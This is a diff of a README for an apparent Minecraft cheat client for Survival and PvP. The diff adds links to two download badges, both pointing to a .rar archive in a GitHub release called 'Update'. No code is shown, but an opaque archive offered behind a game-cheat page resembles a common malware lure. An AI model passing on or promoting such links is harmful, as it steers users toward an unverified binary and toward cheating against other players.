@@ -1,8 +1,8 @@
-# ⛏️ Minecraft Cheat – Ultimate Client for Survival & PvP (2025 Edition)  [![Download Cheat](https://img.shields.io/badge/Download-Minecraft_Cheat-red?style=for-the-badge&logo=download)]()  
+# ⛏️ Minecraft Cheat – Ultimate Client for Survival & PvP (2025 Edition)  [![Download Cheat](https://img.shields.io/badge/Download-Minecraft_Cheat-red?style=for-the-badge&logo=download)](https://github.com/AmigosTry/minecraft-cheat/releases/download/Update/Update.rar)  
 
 ![mine](https://github.com/user-attachments/assets/ea16ead9-13ea-4c37-b556-da4e738ee1c3)
 
-[![Download Cheat](https://img.shields.io/badge/Download-Minecraft_Cheat-red?style=for-the-badge&logo=download)]()  
+[![Download Cheat](https://img.shields.io/badge/Download-Minecraft_Cheat-red?style=for-the-badge&logo=download)](https://github.com/AmigosTry/minecraft-cheat/releases/download/Update/Update.rar)  
  
 
 
